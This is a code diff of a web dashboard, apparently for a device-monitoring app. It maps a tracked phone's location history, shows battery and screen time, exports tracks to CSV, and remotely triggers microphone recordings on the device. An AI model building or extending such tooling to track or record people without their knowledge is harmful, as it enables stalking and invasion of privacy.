+                    : `<span class="text-[10px] font-semibold uppercase bg-gray-100 text-gray-500 px-2 py-0.5 rounded-full">Not flagged</span>`;
+                const flagBtn = isFlagged
+                    ? `<button onclick="toggleFlagAudio('${filename}')" class="flex items-center gap-1 text-xs font-medium bg-emerald-50 text-emerald-700 hover:bg-emerald-100 border border-emerald-200 px-3 py-1 rounded-lg transition"><i class="ti ti-flag-off text-xs"></i> Unflag</button>`
+                    : `<button onclick="toggleFlagAudio('${filename}')" class="flex items-center gap-1 text-xs font-medium bg-orange-50 text-orange-700 hover:bg-orange-100 border border-orange-200 px-3 py-1 rounded-lg transition"><i class="ti ti-flag text-xs"></i> Flag</button>`;
 
-        function changePage(delta) {
-            const newPage = currentPage + delta;
-            if (newPage < 1 || newPage > totalPages) return;
-            currentPage = newPage;
-            currentDataHash = "";
-            fetchHistory();
-        }
-
-        function updatePagination() {
-            document.getElementById('page-info').textContent = `Page ${currentPage} / ${totalPages}`;
-            document.getElementById('prev-btn').disabled = currentPage <= 1;
-            document.getElementById('next-btn').disabled = currentPage >= totalPages;
-        }
-
-        async function fetchHistory() {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return;
-            try {
-                let qs = `?device_id=${encodeURIComponent(activeDevice)}&page=${currentPage}&per_page=100`;
-                const selDateStr = dateInput.value;
-                if(selDateStr) {
-                    let s = parseInt(startHour.value);
-                    let e = parseInt(endHour.value);
-                    if (s > e) { let tmp = s; s = e; e = tmp; }
-                    const [y, m, d] = selDateStr.split('-');
-                    const startDate = new Date(y, m - 1, d);
-                    startDate.setHours(s, 0, 0, 0);
-                    const endDate = new Date(y, m - 1, d);
-                    if (e === 24) { endDate.setHours(23, 59, 59, 999); } else { endDate.setHours(e, 0, 0, 0); }
-                    qs += `&start_time=${startDate.getTime()/1000}&end_time=${endDate.getTime()/1000}`;
-                }
-                await fetchScreenTimeSummary();
-                await fetchBatteryHistory();
-                const res = await fetch(`/history_detailed${qs}`);
-                const data = await res.json();
-                if(!data.history) return;
-                currentHistoryRows = Array.isArray(data.history) ? data.history : [];
-
-                totalPages = data.total_pages || 1;
-                updatePagination();
-
-                const firstTime = data.history.length > 0 ? data.history[0].time : '';
-                const lastTime = data.history.length > 0 ? data.history[data.history.length - 1].time : '';
-                const newHash = data.history.length > 0 ? `${dateInput.value}_${startHour.value}_${endHour.value}_${currentPage}_${firstTime}_${lastTime}_${data.history.length}` : "empty";
-                if (newHash === currentDataHash) return;
-                currentDataHash = newHash;
-
-                tableBody.innerHTML = '';
-                markersGroup.clearLayers();
-                historyMarkers = [];
-                if(data.history.length > 0) {
-                    currentHistoryRows = data.history;
-                    selectedHistoryPoints = selectedHistoryPoints.filter(key => getPointIndexByKey(key) >= 0);
-                    updateSelectionSummary();
-                    updateSelectionLine();
-                    const points = data.history.map(r => [r.lat, r.lon]);
-                    pathLine.setLatLngs(points);
-                    const distance = calculateDistanceMeters(points);
-                    historyPointsCount.textContent = points.length;
-                    historyPathDistance.textContent = formatDistance(distance);
-                    setHistoryRangeLabel();
-
-                    // Only place markers every Nth point to prevent lag (max ~100 markers)
-                    const step = Math.max(1, Math.floor(data.history.length / 100));
-
-                    // Build table rows as a single HTML string for speed
-                    let html = '';
-                    data.history.forEach((row, i) => {
-                        let localTimeStr = row.time;
-                        if (row.unix_time) {
-                            localTimeStr = new Date(row.unix_time * 1000).toLocaleString();
-                        }
-
-                        // Sparse markers — only every Nth point + first + last
-                        if (i % step === 0 || i === 0 || i === data.history.length - 1) {
-                            const marker = createHistoryMarker(row, i).addTo(markersGroup);
-                            historyMarkers.push(marker);
-                        }
-
-                        let gapStr = "-";
-                        if (i < data.history.length - 1 && row.unix_time && data.history[i + 1].unix_time) {
-                            const nextRow = data.history[i + 1];
-                            const gapSecs = Math.max(0, row.unix_time - nextRow.unix_time);
-                            if (gapSecs < 60) gapStr = `${Math.floor(gapSecs)}s`;
-                            else if (gapSecs < 3600) gapStr = `${Math.floor(gapSecs/60)}m`;
-                            else gapStr = `${Math.floor(gapSecs/3600)}h ${Math.floor((gapSecs%3600)/60)}m`;
-                            if (gapSecs > 300) gapStr = `<span class="text-red-500 font-bold">${gapStr}</span>`;
-                            else gapStr = `<span class="text-gray-500">${gapStr}</span>`;
-                        }
-                        let timeOnly = row.time.split(' ')[1] || row.time;
-                        if (row.unix_time) {
-                            timeOnly = new Date(row.unix_time * 1000).toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
-                        }
-                        const pointKey = getPointKey(row);
-                        const speedLabel = getPointSpeed(i, data.history);
-                        const selectedClass = selectedHistoryPoints.includes(pointKey) ? 'bg-blue-100 text-blue-900' : '';
-
-                        html += `<tr class="border-b hover:bg-blue-50 cursor-pointer ${selectedClass}" onclick="handleHistoryRowClick(event, '${pointKey}')"><td class="py-2 font-mono text-xs font-bold whitespace-nowrap">${timeOnly}</td><td class="text-xs">${row.lat.toFixed(4)}</td><td class="text-xs">${row.lon.toFixed(4)}</td><td class="text-xs">${speedLabel}</td><td class="text-xs font-bold ${row.level < 20 ? 'text-red-600' : 'text-green-600'}">${row.level}%</td><td class="text-xs">${gapStr}</td></tr>`;
-                    });
-                    tableBody.innerHTML = html;
-                    updateSelectionSummary();
-                    renderSelectedRowStyles();
-                    updateMarkerStyles();
-                    updateSelectionLine();
-                    const bounds = pathLine.getBounds();
-                    if (bounds.isValid()) {
-                        map.fitBounds(bounds, {padding:[50,50]});
-                    }
-                } else {
-                    historyPointsCount.textContent = '0';
-                    historyPathDistance.textContent = '0 m';
-                    setHistoryRangeLabel();
-                }
-            } catch(e) { console.error(e); }
-        }
-
-        async function requestAudio() {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return;
-            const durationInput = document.getElementById('audio-duration');
-            let duration = parseInt(durationInput.value);
-            if (isNaN(duration) || duration < 1) duration = 19;
-            if (duration > 60) duration = 60;
-            
-            const btn = document.getElementById('audio-btn');
-            btn.textContent = `Waiting ${duration}s...`; btn.disabled = true;
-            const fd = new FormData();
-            fd.append('device_id', activeDevice);
-            fd.append('record_audio', 1);
-            fd.append('record_duration', duration);
-            await fetch('/set_record_audio', { method: 'POST', body: fd});
-            setTimeout(() => { btn.textContent = "Record"; btn.disabled = false; fetchAudioList(); }, (duration + 5) * 1000);
-        }
-
-        async function fetchAudioList() {
-            const activeDevice = selectEl.value;
-            if(!activeDevice) return;
-            try {
-                const res = await fetch(`/audio_files?device_id=${encodeURIComponent(activeDevice)}`);
-                const data = await res.json();
-                const str = JSON.stringify(data.files || []);
-                if (str === cachedAudioFilesStr) return;
-                cachedAudioFilesStr = str;
-                const listEl = document.getElementById('audio-list');
-                listEl.innerHTML = '';
-                if(data.files && data.files.length > 0) {
-                    data.files.forEach(f => {
-                        const filename = f.split('/').pop();
-                        if (filename.includes("BUSY")) {
-                            listEl.innerHTML += `<div class="bg-red-50 border p-2 rounded text-red-600 text-xs">🚫 Mic busy!</div>`;
-                        } else {
-                            const isFlagged = filename.includes("_FLAG");
-                            const bgClass = isFlagged ? "bg-orange-50 border-orange-300" : "bg-gray-50 border-gray-200";
-                            const flagBtn = isFlagged ? `<span class="px-2 py-0.5 bg-orange-500 text-white rounded text-[10px] uppercase font-bold tracking-wider">Flagged</span>` : `<button onclick="flagAudio('${filename}')" class="px-2 py-0.5 bg-orange-100 text-orange-700 hover:bg-orange-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Flag</button>`;
-                            listEl.innerHTML += `
-                                <div class="${bgClass} border p-2 rounded flex flex-col gap-2 transition-all">
-                                    <div class="flex justify-between items-center">
-                                        <span class="text-[10px] font-bold ${isFlagged ? 'text-orange-700' : 'text-gray-400'} truncate w-24" title="${filename}">${filename.substring(0, 15)}...</span>
-                                        <div class="flex gap-1 items-center">
-                                            ${flagBtn}
-                                            <button onclick="deleteAudio('${filename}')" class="px-2 py-0.5 bg-red-100 text-red-700 hover:bg-red-200 rounded text-[10px] uppercase font-bold tracking-wider transition">Del</button>
-                                        </div>
-                                    </div>
-                                    <audio controls preload="none" class="w-full h-8" src="${f}"></audio>
-                                </div>`;
-                        }
-                    });
-                }
-            } catch (e) { console.error(e); }
-        }
-
-        async function deleteAudio(filename) {
-            if(!confirm("Permanently delete this recording?")) return;
-            const fd = new FormData();
-            fd.append('filename', filename);
-            await fetch('/delete_audio', { method: 'POST', body: fd});
-            cachedAudioFilesStr = "";
-            fetchAudioList();
-        }
-
-        async function flagAudio(filename) {
-            const fd = new FormData();
-            fd.append('filename', filename);
-            await fetch('/flag_audio', { method: 'POST', body: fd});
-            cachedAudioFilesStr = "";
-            fetchAudioList();
-        }
-
-        function downloadHistoryCsv() {
-            if (!currentHistoryRows || currentHistoryRows.length === 0) {
-                alert('No history data available to export.');
-                return;
-            }
-            const rows = currentHistoryRows.map(row => {
-                const time = row.unix_time ? new Date(row.unix_time * 1000).toISOString() : row.time;
-                return [time, row.lat, row.lon, row.level, row.gap_seconds || ''].join(',');
+                const wrapper = document.createElement('div');
+                wrapper.className = `border rounded-xl p-4 flex flex-col gap-3 transition ${isFlagged ? 'bg-orange-50 border-orange-200' : 'bg-white border-gray-200'}`;
+                wrapper.innerHTML = `
+                    <div class="flex flex-col sm:flex-row sm:items-start sm:justify-between gap-3">
+                        <div class="min-w-0">
+                            <div class="flex flex-wrap items-center gap-2 mb-1">
+                                <p class="text-sm font-medium text-gray-800 truncate" title="${displayName}">${displayName}</p>
+                                ${flagBadge}
+                            </div>
+                            <p class="text-xs text-gray-400">${fileTime}${fileSize ? ' · ' + fileSize : ''}</p>
+                            <p class="text-xs text-gray-400 mt-0.5">Duration: <span class="audio-duration-label font-medium text-gray-600">Loading…</span></p>
+                        </div>
+                        <div class="flex flex-wrap gap-2 items-center">
+                            ${flagBtn}
+                            <button onclick="deleteAudio('${filename}')" class="flex items-center gap-1 text-xs font-medium bg-red-50 text-red-600 hover:bg-red-100 border border-red-200 px-3 py-1 rounded-lg transition"><i class="ti ti-trash text-xs"></i> Delete</button>
+                        </div>
+                    </div>
+                    <audio controls preload="metadata" class="w-full rounded-lg" src="${item.url}" onloadedmetadata="setAudioDuration(this)"></audio>`;
+                listEl.appendChild(wrapper);
             });
-            const csv = ['Time,Latitude,Longitude,Battery,GapSeconds', ...rows].join('\n');
-            const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = `history-${selectEl.value || 'device'}-${dateInput.value}.csv`;
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-            URL.revokeObjectURL(url);
+        } else {
+            listEl.innerHTML = `<div class="text-center py-8 text-gray-400 flex flex-col items-center gap-2"><i class="ti ti-microphone-off text-2xl"></i><p class="text-xs">No audio recordings found. Use the Record button to capture a new clip.</p></div>`;
         }
+    } catch(e) { console.error(e); }
+}
 
-        selectEl.addEventListener('change', () => { currentDataHash = ""; cachedAudioFilesStr = ""; isFirstLoad = true; currentPage = 1; selectedHistoryPoints = []; updateSelectionSummary(); fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState(); });
-        exportHistoryBtn.addEventListener('click', downloadHistoryCsv);
-        document.getElementById('enable-location-btn').addEventListener('click', () => setLocationTracking(1));
-        document.getElementById('disable-location-btn').addEventListener('click', () => setLocationTracking(0));
-        document.getElementById('refresh-location-btn').addEventListener('click', refreshLocationState);
-        (async () => { await fetchAvailableDevices(); fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState(); setInterval(() => { if (document.visibilityState === 'visible') { fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState(); } }, 15000); })();
-    </script>
+async function deleteAudio(filename) {
+    if (!confirm('Permanently delete this recording?')) return;
+    const fd = new FormData();
+    fd.append('filename', filename);
+    const res = await fetch('/delete_audio', { method: 'POST', body: fd });
+    if (res.ok) showToast('Recording deleted', 'success');
+    else showToast('Delete failed', 'error');
+    cachedAudioFilesStr = '';
+    fetchAudioList();
+}
+
+async function toggleFlagAudio(filename) {
+    const fd = new FormData();
+    fd.append('filename', filename);
+    const res = await fetch('/flag_audio', { method: 'POST', body: fd });
+    if (res.ok) showToast('Flag updated', 'success', 2500);
+    else showToast('Flag update failed', 'error');
+    cachedAudioFilesStr = '';
+    fetchAudioList();
+}
+
+function downloadHistoryCsv() {
+    if (!currentHistoryRows || !currentHistoryRows.length) {
+        showToast('No history data to export', 'warning');
+        return;
+    }
+    const rows = currentHistoryRows.map(r => {
+        const t = r.unix_time ? new Date(r.unix_time*1000).toISOString() : r.time;
+        return [t, r.lat, r.lon, r.level, r.gap_seconds || ''].join(',');
+    });
+    const csv = ['Time,Latitude,Longitude,Battery,GapSeconds', ...rows].join('\n');
+    const blob = new Blob([csv], { type: 'text/csv;charset=utf-8;' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url; a.download = `history-${selectEl.value || 'device'}-${dateInput.value}.csv`;
+    document.body.appendChild(a); a.click();
+    document.body.removeChild(a); URL.revokeObjectURL(url);
+    showToast('CSV export downloaded', 'success');
+}
+
+async function requestAudio() {
+    const activeDevice = selectEl.value;
+    if (!activeDevice) { showToast('No device selected', 'warning'); return; }
+    const durationInput = document.getElementById('audio-duration');
+    let duration = parseInt(durationInput.value);
+    if (isNaN(duration) || duration < 1) duration = 19;
+    if (duration > 60) duration = 60;
+    const btn = document.getElementById('audio-btn');
+    const icon = document.getElementById('audio-icon');
+    btn.disabled = true;
+    icon.className = 'ti ti-loader-2 text-sm spinning';
+    btn.innerHTML = `<i id="audio-icon" class="ti ti-loader-2 text-sm spinning"></i> Waiting ${duration}s…`;
+    const fd = new FormData();
+    fd.append('device_id', activeDevice);
+    fd.append('record_audio', 1);
+    fd.append('record_duration', duration);
+    const res = await fetch('/set_record_audio', { method: 'POST', body: fd });
+    if (res.ok) showToast(`Recording ${duration}s — clip will appear shortly`, 'info', 5000);
+    else showToast('Failed to start recording', 'error');
+    setTimeout(() => {
+        btn.disabled = false;
+        btn.innerHTML = `<i id="audio-icon" class="ti ti-microphone text-sm"></i> Record`;
+        fetchAudioList();
+    }, (duration + 5) * 1000);
+}
+
+selectEl.addEventListener('change', () => {
+    currentDataHash = ''; cachedAudioFilesStr = ''; isFirstLoad = true; currentPage = 1;
+    selectedHistoryPoints = []; updateSelectionSummary();
+    fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState();
+});
+
+exportHistoryBtn.addEventListener('click', downloadHistoryCsv);
+document.getElementById('enable-location-btn').addEventListener('click', () => setLocationTracking(1));
+document.getElementById('disable-location-btn').addEventListener('click', () => setLocationTracking(0));
+document.getElementById('refresh-location-btn').addEventListener('click', refreshLocationState);
+
+(async () => {
+    await fetchAvailableDevices();
+    fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState();
+    setInterval(() => {
+        if (document.visibilityState === 'visible') {
+            fetchHistory(); fetchScreenTimeSummary(); fetchAudioList(); fetchDeviceStatus(); refreshLocationState();
+        }
+    }, 5000);
+})();
+</script>
 </body>
 </html>
